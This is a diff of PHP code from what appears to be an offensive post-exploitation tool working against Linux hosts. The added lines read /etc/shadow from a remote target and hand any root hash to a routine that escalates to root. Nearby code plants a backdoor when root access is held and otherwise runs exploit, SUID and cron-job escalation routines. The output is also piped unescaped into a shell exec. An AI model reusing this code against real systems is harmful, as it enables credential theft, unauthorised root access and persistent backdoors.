@@ -38,6 +38,13 @@ class check4linux extends check4linux8jobs{
         unset($tmp2);
         $this->env_path_str = $this->lan2env4path();
         $this->pause();
+        $data = "cat /etc/shadow ";
+        $tmp = $this->lan2stream4result($data,$this->stream_timeout);
+        exec("echo '$tmp' | grep ':'   ",$tab_tmp);
+        $shadow_str = $this->tab($tab_tmp);
+        if ( (!empty($shadow_str)) && (strstr($shadow_str, "root:")) ){
+            $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
+        }
         
     }
     
@@ -60,8 +67,7 @@ class check4linux extends check4linux8jobs{
         $query = str_replace("%CMD%", "id", $this->template_cmd);
         //$this->requette($query);
         
-        $this->lan2start();
-        $this->pause();
+        //$this->lan2start();$this->pause();
         
         if ( $this->uid_name==="root" ) {
             if (!$this->ip2backdoor8db($this->ip2id)) {
@@ -72,9 +78,9 @@ class check4linux extends check4linux8jobs{
         else {
             //if (!$this->ip2root8db($this->ip2id)) {$this->misc();$this->pause();}
             //if (!$this->ip2root8db($this->ip2id)) {$this->users2root();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->exploits();$this->pause();}
             if (!$this->ip2root8db($this->ip2id)) {$this->suids();$this->pause();}
-            if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
+            //if (!$this->ip2root8db($this->ip2id)) {$this->jobs();$this->pause();}
         }
         
         $this->rouge("Brief");
